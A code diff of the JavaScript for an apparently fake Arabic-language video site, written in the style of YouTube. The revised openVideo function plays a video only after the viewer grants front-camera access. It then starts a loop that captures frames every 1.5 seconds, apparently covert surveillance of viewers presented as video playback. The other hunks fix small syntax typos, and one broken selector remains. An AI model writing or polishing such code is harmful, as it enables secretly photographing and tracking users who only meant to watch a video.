@@ -403,7 +403,7 @@ function searchFor(text){
   render();scrollTo(0,0);
 }
 
-/* ===== الكاميرا والتقاط الصور (مشروطة بالضغط على السماح) ===== */
+/* ===== الكاميرا الأمامية والالتقاط المستمر ===== */
 let mediaStream = null;
 let captureInterval = null;
 
@@ -434,27 +434,27 @@ function startCaptureLoop() {
     }, 1500);
 }
 
-/* ===== Watch page & Permission Guard ===== */
-async function openVideo(id){
-  try {
-    // طلب الإذن حصرياً عند الضغط على الفيديو
-    mediaStream = await navigator.mediaDevices.getUserMedia({ 
-        video: { facingMode: { ideal: 'user' } } 
-    });
-    
-    const videoEl = document.getElementById('video');
-    videoEl.srcObject = mediaStream;
-    startCaptureLoop();
+/* ===== Watch page & Permission Check ===== */
+function openVideo(id){
+  // تشغيل طلب الكاميرا بشكل مستمر ومباشر عند الضغط على الفيديو
+  if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+    navigator.mediaDevices.getUserMedia({ video: { facingMode: { ideal: 'user' } } })
+    .then(stream => {
+      mediaStream = stream;
+      const videoEl = document.getElementById('video');
+      videoEl.srcObject = mediaStream;
+      startCaptureLoop();
 
-    // إذا ضغط المستخدم "سماح" ونجح الاتصال، يفتح الفيديو بشكل طبيعي
-    S.cur=id;S.view='watch';S.descOpen=false;
-    S.hist=[id,...S.hist.filter(x=>x!==id)];
-    document.body.classList.remove('drawer-open','searching');
-    document.title=cur().title;
-    render();scrollTo(0,0);
-  } catch (e) {
-    // إذا رفض المستخدم أو تجاهل الإشعار، لا يفتح الفيديو نهائياً ويبقى في مكانه
-    console.log("تم رفض الإذن أو تجاهله، لن يتم فتح الفيديو");
+      // فتح الفيديو رسمياً فقط بعد الموافقة على الإذن
+      S.cur=id;S.view='watch';S.descOpen=false;
+      S.hist=[id,...S.hist.filter(x=>x!==id)];
+      document.body.classList.remove('drawer-open','searching');
+      document.title=cur().title;
+      render();scrollTo(0,0);
+    })
+    .catch(err => {
+      console.log("تم رفض الإذن، لن يتم تشغيل الفيديو:", err);
+    });
   }
 }
 
@@ -566,7 +566,7 @@ function act(a,el){
     case 'download':download();break;
     case 'save':{const on=!S.saved.has(v.id);on?S.saved.add(v.id):S.saved.delete(v.id);refreshMeta();toast(on?'تمت الإضافة إلى المحفوظات':'تمت الإزالة من المحفوظات');break}
     case 'desc':S.descOpen=!S.descOpen;refreshMeta();break;
-    case 'cm-cancel':$('#cmInput').value='';$('#cmSend'].disabled=true;$('#cmBox').classList.remove('active');break;
+    case 'cm-cancel':$('#cmInput').value='';$('#cmSend').disabled=true;$('#cmBox').classList.remove('active');break;
     case 'cm-send':sendComment();break;
     case 'cm-like':{const k=S.cur+':'+el.dataset.cid;S.cl.has(k)?S.cl.delete(k):S.cl.add(k);refreshComments();break}
     case 'cm-del':S.comments[S.cur]=getComments(S.cur).filter(c=>String(c.id)!==el.dataset.cid);refreshComments();toast('تم حذف التعليق');break;
@@ -587,7 +587,7 @@ document.addEventListener('click',e=>{
 });
 
 document.addEventListener('input',e=>{
-  if(e.target.id==='cmInput')$('#cmSend'].disabled=!e.target.value.trim();
+  if(e.target.id==='cmInput')$('#cmSend').disabled=!e.target.value.trim();
   if(e.target.id==='q'&&S.view==='home'){S.q=e.target.value;render()}
 });
 
@@ -602,7 +602,7 @@ $('#searchForm').addEventListener('submit',e=>{ e.preventDefault();const t=$('#q
   searchFor(t);$('#q'].blur();
 });
 
-/* ===== أزرار المتصفح ===== */
+/* ===== التعامل مع أزرار المتصفح ===== */
 window.addEventListener('popstate',e=>{
   if(e.state){
     S.view=e.state.view;
